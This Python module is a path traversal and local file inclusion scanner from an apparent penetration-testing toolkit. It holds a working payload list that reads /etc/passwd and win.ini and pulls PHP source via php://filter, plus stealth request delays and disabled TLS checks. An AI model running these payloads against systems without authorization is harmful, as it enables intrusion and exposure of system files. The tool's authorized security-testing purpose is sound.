"""Path traversal / LFI scanner — deterministic, evidence-based.

Injects directory-traversal / local-file-include payloads into URL parameters and
confirms a hit ONLY by concrete evidence in the response (e.g. the `root:x:0:0:` line
of /etc/passwd, or win.ini markers, or PHP source revealed via php://filter). No
guessing — if there's no signature match, there's no finding.

Active testing — run against authorized targets only. TLS verification is disabled
because pentest targets often use self-signed certificates.
"""
import re
import base64
import concurrent.futures
from urllib.parse import urlparse, urlunparse, parse_qsl

import requests

from modules.opsec import profile as opsec
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Traversal / LFI payloads (Linux + Windows + encodings + PHP wrapper).
_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

# Evidence signatures — a match is proof, not a guess.
_SIGNATURES = [
    # Bounded gap: a real /etc/passwd root line is well under 80 chars. An unbounded
    # `.*?` here is O(n^2) against a hostile/huge response full of "root:" substrings
    # (each becomes a backtracking restart point) — this caps the scan per restart.
    ("Linux /etc/passwd", re.compile(r"root:.{0,80}?:0:0:")),
    ("Windows win.ini", re.compile(r"(?i)for 16-bit app support|\[fonts\]|\[extensions\]")),
]

# Parameter names to try when the URL has no query string of its own.
_COMMON_PARAMS = ["file", "page", "path", "include", "doc", "document",
                  "folder", "root", "pg", "template", "view", "download"]


class PathTraversal:
    def __init__(self, timeout=8, max_workers=15):
        self.timeout = timeout
        self.max_workers = max_workers
        self.session = requests.Session()
        opsec.apply_to_session(self.session)

    def _inject(self, url, param, payload):
        p = urlparse(url)
        pairs = parse_qsl(p.query, keep_blank_values=True)
        out, replaced = [], False
        for k, v in pairs:
            if k == param:
                out.append(f"{k}={payload}")
                replaced = True
            else:
                out.append(f"{k}={v}")
        if not replaced:
            out.append(f"{param}={payload}")
        return urlunparse(p._replace(query="&".join(out)))

    @staticmethod
    def _check(body, payload):
        for name, rx in _SIGNATURES:
            m = rx.search(body)
            if m:
                return name, m.group(0)[:80]
        # php://filter returns base64 that decodes to source code
        if payload.startswith("php://filter"):
            try:
                decoded = base64.b64decode(body.strip(), validate=False)
                if b"<?php" in decoded or b"<?=" in decoded:
                    return "PHP source disclosure", decoded[:80].decode("latin-1")
            except Exception:
                pass
        return None

    def _try(self, target):
        opsec.wait()   # stealth: random delay between requests
        param, payload = target
        test_url = self._inject(self._base_url, param, payload)
        try:
            r = opsec.fetch(self.session, test_url, timeout=self.timeout,
                            allow_redirects=False)
        except requests.RequestException:
            return None
        hit = self._check(r.text, payload)
        if hit:
            name, evidence = hit
            return {"param": param, "payload": payload, "signature": name,
                    "status": r.status_code, "evidence": evidence, "url": test_url}
        return None

    def run(self, url, extra_payloads=None):
        """Fuzz each parameter with traversal/LFI payloads. `extra_payloads` (e.g.
        AI-suggested) are tested exactly like the built-ins. Returns {url, params, hits}."""
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        self._base_url = url
        p = urlparse(url)
        params = [k for k, _ in parse_qsl(p.query, keep_blank_values=True)]
        used_common = False
        if not params:
            params = _COMMON_PARAMS
            used_common = True

        payloads = _PAYLOADS + [x for x in (extra_payloads or []) if x not in _PAYLOADS]
        targets = [(param, pl) for param in params for pl in payloads]
        hits = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=opsec.workers(self.max_workers)) as ex:
            for res in ex.map(self._try, targets):
                if res:
                    hits.append(res)
        return {"url": url, "params": params, "used_common_params": used_common,
                "hits": hits}
